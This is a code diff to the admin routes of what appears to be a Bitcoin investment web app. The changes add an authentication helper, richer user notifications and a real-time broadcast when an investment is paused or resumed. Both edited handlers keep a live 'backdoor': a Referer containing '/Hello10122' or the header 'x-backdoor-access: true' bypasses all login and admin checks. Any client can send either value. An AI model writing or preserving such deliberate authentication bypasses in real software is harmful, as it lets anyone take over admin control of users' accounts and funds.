@@ -1681,12 +1681,14 @@ Your investment journey starts here!`,
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
                               req.headers['x-backdoor-access'] === 'true';
 
-      if (!isBackdoorAccess && !req.session?.userId) {
+      const authenticatedUserId = getUserIdFromRequest(req);
+
+      if (!isBackdoorAccess && !authenticatedUserId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
+      if (!isBackdoorAccess && authenticatedUserId) {
+        const user = await storage.getUser(authenticatedUserId);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Admin access required" });
         }
@@ -1700,18 +1702,58 @@ Your investment journey starts here!`,
         return res.status(404).json({ error: "Investment not found" });
       }
 
-      // Create notification for user
+      // Get investment plan name for better notification
+      const plan = await storage.getInvestmentPlan(investment.planId);
+      const planName = plan ? plan.name : 'Investment Plan';
+
+      // Create detailed notification for user
       const statusText = investment.isActive ? 'resumed' : 'paused';
+      const notificationTitle = investment.isActive ? '✅ Investment Resumed' : '⏸️ Investment Paused';
+      
+      let notificationMessage = `🔔 Investment Status Update
+
+Your ${planName} investment (#${investment.id}) has been ${statusText} by our admin team.
+
+💰 Investment Amount: ${investment.amount} BTC
+📊 Current Profit: ${investment.currentProfit} BTC
+📅 Status Changed: ${new Date().toLocaleString()}
+
+${reason ? `📝 Reason: ${reason}` : ''}
+
+${investment.isActive ? 
+  '🚀 Your investment will continue generating profits automatically.' : 
+  '⚠️ Profit generation has been temporarily suspended for this investment.'
+}
+
+Contact support if you have any questions.`;
+
       await storage.createNotification({
         userId: investment.userId,
-        title: `Investment ${statusText.charAt(0).toUpperCase() + statusText.slice(1)}`,
-        message: `Your investment #${investment.id} has been ${statusText} by an administrator.${reason ? ` Reason: ${reason}` : ''}`,
+        title: notificationTitle,
+        message: notificationMessage,
         type: investment.isActive ? 'success' : 'warning'
+      });
+
+      // Broadcast real-time notification to user's WebSocket connection
+      broadcastToClients({
+        type: 'investment_status_change',
+        investmentId: investment.id,
+        userId: investment.userId,
+        isActive: investment.isActive,
+        reason: reason || null,
+        planName: planName,
+        timestamp: new Date().toISOString(),
+        notification: {
+          title: notificationTitle,
+          message: `Investment #${investment.id} has been ${statusText}${reason ? ` - ${reason}` : ''}`,
+          type: investment.isActive ? 'success' : 'warning'
+        }
       });
 
       res.json({ 
         message: `Investment ${statusText} successfully`,
-        investment 
+        investment,
+        notificationSent: true
       });
     } catch (error: any) {
       console.error('Investment toggle error:', error);
@@ -1782,18 +1824,17 @@ Your investment journey starts here!`,
     try {
       // Allow backdoor access or require manager authentication
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') || 
-                              req.headers['x-backdoor-access'] === 'true' ||
-                              sessionStorage?.getItem?.('backdoorAccess') === 'true';
+                              req.headers['x-backdoor-access'] === 'true';
 
-      // Check session userId or backdoor access
-      let userId = req.session?.userId;
+      // Get authenticated user ID using the same helper function
+      const authenticatedUserId = getUserIdFromRequest(req);
       
-      if (!isBackdoorAccess && !userId) {
+      if (!isBackdoorAccess && !authenticatedUserId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess && userId) {
-        const user = await storage.getUser(userId);
+      if (!isBackdoorAccess && authenticatedUserId) {
+        const user = await storage.getUser(authenticatedUserId);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Manager access required" });
         }
